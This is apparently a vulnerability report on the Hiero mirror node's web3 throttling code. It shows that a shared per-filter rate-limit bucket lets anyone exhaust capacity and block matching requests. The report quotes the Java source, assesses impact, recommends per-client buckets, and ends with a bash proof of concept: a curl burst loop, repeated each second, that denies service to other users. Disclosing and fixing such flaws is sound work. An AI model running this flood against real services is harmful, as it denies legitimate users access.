### Title
Shared Per-Filter THROTTLE Bucket Exhaustion Enables Targeted DoS Against Matching Requests

### Summary
The `THROTTLE` action in `RequestProperties` creates a single shared `Bucket4j` bucket with capacity equal to `rate` (max 100 tokens) that is consumed by every user whose request matches the filter. An unprivileged attacker can exhaust this shared bucket with a burst of 100 matching requests (well within the global 500 req/s limit), causing all subsequent matching requests from other users to receive a `ThrottleException` for up to one second. The attacker can sustain this denial-of-service indefinitely by repeating the burst every second.

### Finding Description

**Root cause — `createBucket()` in `RequestProperties.java` lines 63–69:**

```java
private Bucket createBucket() {
    final var bandwidth = Bandwidth.builder()
            .capacity(rate)                              // max 100 tokens
            .refillGreedy(rate, Duration.ofSeconds(1))  // refills rate tokens/sec
            .build();
    return Bucket.builder().addLimit(bandwidth).build();
}
```

`rate` is constrained to `[0, 100]` by `@Min(0) @Max(100)` on line 39 of `RequestProperties.java`. The resulting bucket therefore has a hard ceiling of **100 tokens** and a refill of at most **100 tokens per second**. This single bucket instance is shared across every incoming request — there is no per-IP or per-user isolation.

**Consumption path — `action()` in `ThrottleManagerImpl.java` lines 70–74:**

```java
case THROTTLE -> {
    if (!filter.getBucket().tryConsume(1)) {
        throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
    }
}
```

Every request that passes `filter.test()` consumes exactly 1 token from this shared bucket. For the `THROTTLE` action, `test()` skips the random-sampling guard (line 50 of `RequestProperties.java`: `if (action != ActionType.THROTTLE && ...)`), so **100% of matching requests** reach `tryConsume`.

**Why the global rate limit does not protect against this:**

`ThrottleManagerImpl.throttle()` checks the global `rateLimitBucket` first (line 38), which has a default capacity of **500 req/s** (`ThrottleProperties.requestsPerSecond = 500`). An attacker can send 100 matching requests in a single burst — consuming only 100 of the 500 available global tokens — and fully drain the per-filter bucket. The remaining 400 global tokens per second are available for the attacker's non-matching requests, which never touch the filter bucket.

### Impact Explanation

Once the 100-token filter bucket is exhausted, every other user whose request matches the filter receives `ThrottleException("Requests per second rate limit exceeded")` for up to one full second. If the filter targets a broad pattern (e.g., a specific contract address or call-data prefix), this is a targeted denial-of-service against all users of that contract. The attacker's own non-matching traffic is completely unaffected. Severity is **Medium–High**: availability impact is real and repeatable, but is bounded to the subset of requests matching the filter.

### Likelihood Explanation

No authentication or special privilege is required. The attacker only needs to know (or guess) what request pattern the filter matches — which may be inferable from public documentation or by probing. Sending 100 HTTP requests in a burst is trivial with any HTTP client (`curl`, `ab`, `wrk`). The attack is fully repeatable every ~1 second and can be automated with a simple loop.

### Recommendation

1. **Per-source-IP (or per-client) bucket isolation**: Replace the single shared `Bucket` with a `BucketProxyManager` keyed on the client's IP address, so one client cannot exhaust capacity for others.
2. **Decouple sampling rate from bucket capacity**: The `rate` field currently serves two unrelated purposes (sampling percentage for LOG/REJECT, and token capacity for THROTTLE). Introduce a separate `throttleRate` or `burstCapacity` field for the bucket, allowing operators to set a meaningful per-second ceiling independent of the 0–100 sampling scale.
3. **Increase minimum bucket capacity or add a separate global THROTTLE ceiling**: If per-user buckets are not feasible, at minimum raise the `@Max` constraint on `rate` so the shared bucket is not trivially exhaustible.

### Proof of Concept

**Precondition**: A `THROTTLE` filter is configured matching requests to contract address `0xABCD` with `rate=100`.

**Steps**:
```bash
# Step 1: Attacker exhausts the shared filter bucket (100 tokens) in one burst
for i in $(seq 1 100); do
  curl -s -X POST http://mirror-node/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"to":"0xABCD","data":"0x","gas":21000}' &
done
wait

# Step 2: Legitimate user immediately sends a matching request — gets throttled
curl -X POST http://mirror-node/api/v1/contracts/call \
  -H 'Content-Type: application/json' \
  -d '{"to":"0xABCD","data":"0x","gas":21000}'
# Response: 429 / ThrottleException: "Requests per second rate limit exceeded"

# Step 3: Attacker continues with non-matching requests — unaffected
curl -X POST http://mirror-node/api/v1/contracts/call \
  -H 'Content-Type: application/json' \
  -d '{"to":"0x1111","data":"0x","gas":21000}'
# Response: 200 OK

# Step 4: Repeat Step 1 every ~1 second to sustain the DoS
```

**Relevant code locations:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/RequestProperties.java (L37-42)
```java
    @Min(0)
    @Max(100)
    private long rate = 100;

    @Getter(lazy = true)
    private final Bucket bucket = createBucket();
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/RequestProperties.java (L63-69)
```java
    private Bucket createBucket() {
        final var bandwidth = Bandwidth.builder()
                .capacity(rate)
                .refillGreedy(rate, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(bandwidth).build();
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L44-48)
```java
        for (var requestFilter : throttleProperties.getRequest()) {
            if (requestFilter.test(request)) {
                action(requestFilter, request);
            }
        }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L70-74)
```java
            case THROTTLE -> {
                if (!filter.getBucket().tryConsume(1)) {
                    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
                }
            }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L34-35)
```java
    @Min(1)
    private long requestsPerSecond = 500;
```
